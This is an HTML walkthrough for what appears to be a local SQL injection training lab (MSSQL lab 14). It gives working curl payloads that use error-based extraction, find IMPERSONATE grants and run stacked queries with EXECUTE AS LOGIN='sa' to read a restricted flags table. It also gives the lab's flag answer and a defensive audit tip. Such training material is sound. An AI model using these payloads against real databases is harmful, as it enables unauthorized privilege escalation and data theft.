<h4>Step 1: Test Normal Lookup</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Lookup</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br><br>
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">SQL: </span>SELECT id, title, content FROM notes WHERE id = '1'<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Public Data</strong><br>
        This is publicly accessible information
    </div>
</div>

<h4>Step 2: Identify Current User (Low-Privilege)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. User Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Current login:</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT SYSTEM_USER)) -- -"<br><br>
        <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT SYSTEM_USER)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'lab14_web_user' to data type int.</strong><br><br>
        <span class="prompt">// Check sysadmin (should be NO):</span><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'YES_SYSADMIN' ELSE 'NOT_SYSADMIN' END)) -- -"<br><br>
        <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT CASE WHEN IS_SRVROLEMEMBER('sysadmin')=1 THEN 'YES_SYSADMIN' ELSE 'NOT_SYSADMIN' END)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'NOT_SYSADMIN' to data type int.</strong>
    </div>
</div>

<h4>Step 3: Attempt Direct Flag Access (DENIED)</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Access Denied</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br><br>
        <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: The SELECT permission was denied on the object 'flags', database 'sqli_arena_mssql_lab14', schema 'dbo'.</strong><br><br>
        <span class="prompt">// UNION also fails:</span><br>
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "id=' UNION SELECT 1, flag, 'x' FROM flags -- -"<br>
        <span class="prompt">Input: </span>' UNION SELECT 1, flag, 'x' FROM flags -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: The SELECT permission was denied on the object 'flags', database 'sqli_arena_mssql_lab14', schema 'dbo'.</strong>
    </div>
</div>

<h4>Step 4: Discover Impersonation Targets</h4>
<p>Check <code>sys.server_permissions</code> for IMPERSONATE grants on this user:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. IMPERSONATE Discovery</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 pr2.name FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id=pr.principal_id JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id WHERE pe.permission_name='IMPERSONATE' AND pr.name='lab14_web_user')) -- -"<br><br>
        <span class="prompt">Input: </span>1' AND 1=CONVERT(INT, (SELECT TOP 1 pr2.name FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id=pr.principal_id JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id WHERE pe.permission_name='IMPERSONATE' AND pr.name='lab14_web_user')) -- -<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the nvarchar value 'sa' to data type int.</strong><br><br>
        <span class="prompt">Found: </span>lab14_web_user can impersonate <strong>sa</strong> (sysadmin)!
    </div>
</div>

<h4>Step 5: Impersonate sa and Write Flag to Notes</h4>
<p>Use stacked queries to impersonate sa, read the flag, and write it to an accessible table:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Privilege Escalation + Flag Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Impersonate sa, copy flag to notes, revert:</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -"<br><br>
        <span class="prompt">Input: </span>1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -<br>
        <span class="prompt">Output: </span>Public Data -- This is publicly accessible information (stacked query executed silently)<br><br>
        <span class="prompt">// Now read note 1 (as original low-priv user):</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br><br>
        <span class="prompt">Input: </span>1<br>
        <span class="prompt">Output:</span><br>
        <strong>Public Data</strong><br>
        <strong>FLAG{ms_3x3cut3_4s_pr1v3sc}</strong>
    </div>
</div>

<h4>Step 6: Why CONVERT Doesn't Work in Stacked Queries</h4>
<p>
    The CONVERT error-based technique doesn't propagate through stacked queries when the
    first <code>SELECT</code> succeeds. PDO returns the first result set and discards
    errors from subsequent statements. The UPDATE-then-read approach (Step 5) is the
    reliable method for extracting data across privilege boundaries.
</p>

<h4>Step 7: Enumerate All Impersonatable Accounts</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Impersonation Audit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// List all IMPERSONATE grants:</span><br>
        <span class="prompt">Input: </span>' UNION SELECT 1, pr.name + ' can impersonate ' + pr2.name, 'IMPERSONATE' FROM sys.server_permissions pe JOIN sys.server_principals pr ON pe.grantee_principal_id=pr.principal_id JOIN sys.server_principals pr2 ON pe.grantor_principal_id=pr2.principal_id WHERE pe.permission_name='IMPERSONATE' -- -<br>
        <span class="prompt">Output: </span><strong>lab14_web_user can impersonate sa</strong>
    </div>
</div>

<h4>Step 8: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_3x3cut3_4s_pr1v3sc}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit Chain</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Step 1: Direct access fails</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1' AND 1=CONVERT(INT, (SELECT TOP 1 flag FROM flags)) -- -"<br>
        <span class="prompt">Result: </span><strong>MSSQL Error: SQLSTATE[42000]: The SELECT permission was denied on the object 'flags', database 'sqli_arena_mssql_lab14', schema 'dbo'.</strong><br><br>
        <span class="prompt">// Step 2: Impersonate sa and write flag to notes</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1'; EXECUTE AS LOGIN='sa'; UPDATE notes SET content=(SELECT TOP 1 flag FROM flags) WHERE id=1; REVERT; -- -"<br>
        <span class="prompt">Result: </span>Public Data -- This is publicly accessible information (stacked query ran; flag written to notes)<br><br>
        <span class="prompt">// Step 3: Read the flag from notes</span><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab14" \<br> --data-urlencode "id=1"<br>
        <span class="prompt">Output: </span><strong>Public Data -- FLAG{ms_3x3cut3_4s_pr1v3sc}</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's <code>EXECUTE AS LOGIN</code> and
    <code>EXECUTE AS USER</code> allow privilege escalation when <code>IMPERSONATE</code>
    permissions are misconfigured. In this lab, <code>lab14_web_user</code> cannot read the
    flags table directly (SELECT is denied), but it can impersonate <code>sa</code> to bypass
    all permission checks. The attack chain: (1) discover IMPERSONATE grants via
    <code>sys.server_permissions</code>, (2) use stacked queries with <code>EXECUTE AS LOGIN='sa'</code>,
    (3) read restricted data as sa, (4) <code>REVERT</code> to return to original context.
    Never grant <code>IMPERSONATE</code> on <code>sa</code> to application accounts.
    Audit with: <code>SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE'</code>.
</div>
